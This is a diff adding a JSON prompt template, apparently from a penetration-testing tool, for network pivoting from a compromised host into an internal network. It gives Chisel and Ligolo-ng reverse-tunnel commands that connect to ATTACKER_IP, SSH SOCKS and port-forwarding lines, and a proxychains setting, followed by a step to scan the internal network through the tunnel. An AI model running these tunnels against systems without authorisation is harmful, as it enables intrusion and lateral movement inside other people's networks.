@@ -1,0 +1,10 @@
+{
+  "name": "Network Pivoting",
+  "description": "Network pivoting techniques",
+  "category": "network",
+  "variables": [
+    "compromised_ip",
+    "target_network"
+  ],
+  "content": "Configure pivoting from {compromised_ip} to {target_network}.\n\n**Chisel (recommended) :**\n```bash\n# Server (attacker)\nchisel server -p 8080 --reverse\n\n# Client (target)\nchisel client ATTACKER_IP:8080 R:socks\n```\n\n**Ligolo-ng :**\n```bash\n# Proxy (attacker)\nligolo-proxy -selfcert\n\n# Agent (target)\nligolo-agent -connect ATTACKER_IP:11601 -ignore-cert\n```\n\n**SSH tunneling :**\n```bash\n# Dynamic port forwarding (SOCKS)\nssh -D 9050 user@{compromised_ip}\n\n# Local port forwarding\nssh -L 8080:INTERNAL_IP:80 user@{compromised_ip}\n```\n\n**Proxychains configuration :**\n```\nsocks5 127.0.0.1 1080\n```\n\nThen scan the internal network through the tunnel."
+}
